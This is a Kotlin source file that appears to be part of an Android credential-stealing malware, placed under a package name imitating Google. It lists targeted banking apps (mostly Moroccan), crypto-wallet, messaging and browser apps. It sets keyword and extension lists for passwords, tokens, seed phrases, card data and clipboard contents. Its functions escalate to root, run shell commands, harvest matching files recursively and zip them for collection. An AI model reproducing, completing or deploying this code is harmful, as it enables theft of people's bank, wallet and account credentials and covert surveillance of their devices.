package com.google.system

import java.io.BufferedReader
import java.io.File
import java.io.FileInputStream
import java.io.InputStreamReader
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

internal val HIGH_VALUE_APPS = mapOf(
    "com.discord" to "Discord",
    "com.aliucord" to "Aliucord",
    "org.telegram.messenger" to "Telegram",
    "org.telegram.messenger.web" to "Telegram Web",
    "org.thoughtcrime.securesms" to "Signal",
    "com.whatsapp" to "WhatsApp",
    "com.instagram.android" to "Instagram",
    "com.facebook.katana" to "Facebook",
    "com.twitter.android" to "Twitter/X",
    "com.snapchat.android" to "Snapchat",
    "com.zhiliaoapp.musically" to "TikTok",
    "com.netflix.mediaclient" to "Netflix",
    "com.spotify.music" to "Spotify",
    "com.amazon.mShop.android.shopping" to "Amazon",
    "com.paypal.android.p2pmobile" to "PayPal",
    "com.coinbase.android" to "Coinbase",
    "com.binance.dev" to "Binance",
    "io.metamask" to "MetaMask",
    "com.wallet.crypto.trustapp" to "Trust Wallet",
    "com.phantom" to "Phantom",
    "com.exodus.exodus" to "Exodus",
    "com.blockchainvault" to "Blockchain.com",
    "com.google.android.youtube" to "YouTube",
    "com.microsoft.office.outlook" to "Outlook",
    "com.google.android.gm" to "Gmail",
    "com.dropbox.android" to "Dropbox",
    "com.google.android.apps.docs" to "Google Docs",
)

internal val BROWSERS = mapOf(
    "com.android.chrome" to "Chrome",
    "com.chrome.beta" to "Chrome Beta",
    "com.chrome.dev" to "Chrome Dev",
    "com.brave.browser" to "Brave",
    "com.microsoft.emmx" to "Edge",
    "com.opera.browser" to "Opera",
    "com.opera.gx" to "Opera GX",
    "org.mozilla.firefox" to "Firefox",
    "com.sec.android.app.sbrowser" to "Samsung Browser",
    "com.duckduckgo.mobile.android" to "DuckDuckGo",
    "com.vivaldi.browser" to "Vivaldi",
)

internal val BANKS_MOROCCO = mapOf(
    "com.attijariwafabank.main" to "Attijariwafa Bank",
    "ma.gbp.pocketbank" to "Banque Populaire",
    "com.b3g.cih.online" to "CIH Bank",
    "ma.creditagricole.banke" to "Crédit Agricole",
    "com.sgma.prod" to "Société Générale",
    "com.mysoge.prod" to "SoGé",
    "com.BMCE_prod.bad" to "BMCE Direct",
    "com.cfgbank.mobileapp" to "CFG Bank",
    "ma.gbp.bpay" to "BPAY",
    "com.cashplus.mobileapp" to "Cash Plus",
)

internal val SENSITIVE_PATTERNS = listOf(
    "password", "passwd", "pwd", "secret", "token", "auth", "login",
    "credential", "key", "cert", "private", "wallet", "seed", "mnemonic",
    "backup", "config", "api_key", "apikey", "access_token", "refresh_token",
    "bearer", "session", "cookie", "oauth", "jwt", "account", "profile",
    "user_data", "userdata", "settings", "database", "preferences",
    "pin", "cvv", "cvc", "ssn", "identity", "passport", "id_card",
)

internal val HIGH_VALUE_EXTS = setOf(
    ".key", ".pem", ".crt", ".p12", ".keystore", ".jks",
    ".env", ".config", ".ini", ".yml", ".yaml", ".toml",
    ".json", ".xml", ".db", ".sqlite", ".sql",
    ".wallet", ".dat", ".bak", ".backup",
    ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
    ".txt", ".rtf", ".csv", ".log",
    ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp",
    ".mp4", ".avi", ".mkv", ".mov", ".wmv", ".flv",
    ".zip", ".rar", ".7z", ".tar", ".gz",
    ".kdbx", ".kdb", ".ovpn", ".conf",
    ".html", ".htm", ".php", ".asp", ".aspx",
    ".der", ".cer", ".pfx",
)

internal val CLIPBOARD_KEYWORDS = listOf(
    "password", "token", "key", "secret", "auth",
    "bitcoin", "btc", "eth", "ethereum", "sol", "solana",
    "0x", "bc1", "private", "seed", "mnemonic",
    "api_key", "apikey", "access_token", "refresh_token",
    "bearer", "authorization", "credit", "card", "cvv",
    "pin", "login", "username", "password",
)

internal const val MAX_ZIP = 50L * 1024 * 1024
internal const val MAX_FILE = 5L * 1024 * 1024
internal const val MAX_FILES = 100

private var rootCached = false
private var rootAvailable = false

internal fun checkRoot(): Boolean {
    if (rootCached) return rootAvailable
    rootCached = true
    val paths = listOf("/system/bin/su", "/system/xbin/su", "/sbin/su", "/su/bin/su", "/data/local/xbin/su", "/data/local/bin/su", "/system/app/Superuser.apk")
    if (paths.any { File(it).exists() }) {
        rootAvailable = true
        return true
    }
    return try {
        val p = Runtime.getRuntime().exec(arrayOf("su", "-c", "id"))
        val output = p.inputStream.bufferedReader().readText()
        p.waitFor()
        p.inputStream.close()
        rootAvailable = output.contains("uid=0")
        rootAvailable
    } catch (_: Exception) { false }
}

internal fun runCommand(cmd: String): String {
    return try {
        val useRoot = checkRoot()
        val p = if (useRoot) Runtime.getRuntime().exec(arrayOf("su", "-c", cmd))
                 else Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
        val reader = BufferedReader(InputStreamReader(p.inputStream))
        val output = reader.readText()
        reader.close()
        p.inputStream.close()
        p.errorStream?.close()
        p.waitFor()
        p.destroy()
        output
    } catch (_: Exception) { "" }
}

internal fun collectDeep(dir: File, found: MutableList<File>, max: Int) {
    if (found.size >= max) return
    try {
        val files = dir.listFiles() ?: return
        for (f in files.sortedByDescending { it.length() }) {
            if (found.size >= max) return
            if (f.isDirectory) collectDeep(f, found, max)
            else if (f.isFile && f.length() in 1..MAX_FILE) {
                val n = f.name.lowercase()
                if (SENSITIVE_PATTERNS.any { n.contains(it) } || HIGH_VALUE_EXTS.any { n.endsWith(it) }) {
                    found.add(f)
                }
            }
        }
    } catch (_: Exception) {}
}

internal fun collectDeepExts(dir: File, found: MutableList<File>, max: Int, exts: Set<String>) {
    if (found.size >= max) return
    try {
        val files = dir.listFiles() ?: return
        for (f in files.sortedByDescending { it.length() }) {
            if (found.size >= max) return
            if (f.isDirectory) collectDeepExts(f, found, max, exts)
            else if (f.isFile && f.length() in 1..MAX_FILE) {
                if (exts.any { f.name.lowercase().endsWith(it) }) {
                    found.add(f)
                }
            }
        }
    } catch (_: Exception) {}
}

internal fun zip(file: File, entryName: String, zos: ZipOutputStream): Boolean {
    return try {
        zos.putNextEntry(ZipEntry(entryName))
        FileInputStream(file).use { fis ->
            val buf = ByteArray(8192)
            var n: Int
            while (fis.read(buf).also { n = it } > 0) zos.write(buf, 0, n)
        }
        zos.closeEntry()
        true
    } catch (_: Exception) { false }
}

internal fun isSensitive(name: String): Boolean {
    val n = name.lowercase()
    return SENSITIVE_PATTERNS.any { n.contains(it) } || HIGH_VALUE_EXTS.any { n.endsWith(it) }
}

internal fun isWallet(pkg: String) = pkg.contains("wallet") || pkg.contains("coin") ||
    pkg.contains("crypto") || pkg.contains("metamask") || pkg.contains("phantom") ||
    pkg.contains("trust") || pkg.contains("exodus") || pkg.contains("blockchain") ||
    pkg.contains("binance")

internal fun listFiles(path: String, max: Int = 100): String {
    return runCommand("ls -la $path 2>/dev/null | head -$max")
}

internal fun readFile(path: String): String? {
    return try {
        val f = File(path)
        if (f.exists() && f.canRead() && f.length() < MAX_FILE) {
            f.readText()
        } else if (checkRoot()) {
            runCommand("cat $path 2>/dev/null").takeIf { it.length in 1..MAX_FILE.toInt() }
        } else null
    } catch (_: Exception) { null }
}
